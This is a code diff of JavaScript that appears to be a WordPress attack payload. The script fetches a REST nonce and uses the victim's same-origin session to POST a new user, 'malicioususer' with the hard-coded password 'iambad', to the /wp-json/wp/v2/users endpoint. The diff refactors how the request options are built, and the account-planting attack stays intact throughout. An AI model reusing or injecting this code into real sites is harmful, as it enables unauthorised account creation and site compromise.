@@ -22,6 +22,32 @@ function getPassword() {
   return 'iambad';
 }
 
+function getFetchOptionsPromise() {
+  return new Promise((resolve, reject) => {
+    getNoncePromise()
+      .then((nonce) => {
+        resolve({
+          method: 'POST',
+          credentials: 'same-origin',
+          headers: {
+            'X-WP-Nonce': nonce,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            username: 'malicioususer',
+            email: 'malicioususer@example.com',
+            password: getPassword(),
+            roles: 'subscriber',
+          })
+        })
+      })
+      .catch((response) => {
+        console.error('Failed to get Nonce', {response});
+        reject(response);
+      });
+    });
+}
+
 /**
  * Get the WP REST API endpoint for users.
  *
@@ -31,24 +57,9 @@ function getUsersEndpoint() {
   return '/wp-json/wp/v2/users';
 }
 
-getNoncePromise()
-  .then((nonce) => {
+getFetchOptionsPromise()
+  .then((fetchOptions) => {
     const endPoint = '/wp-json/wp/v2/users';
-    const fetchOptions = {
-      method: 'POST',
-      credentials: 'same-origin',
-      headers: {
-        'X-WP-Nonce': nonce,
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        username: 'malicioususer',
-        email: 'malicioususer@example.com',
-        password: getPassword(),
-        roles: 'subscriber',
-      })
-    };
-
     fetch(getUsersEndpoint(), fetchOptions)
       .then((response) => {
         console.log({response});
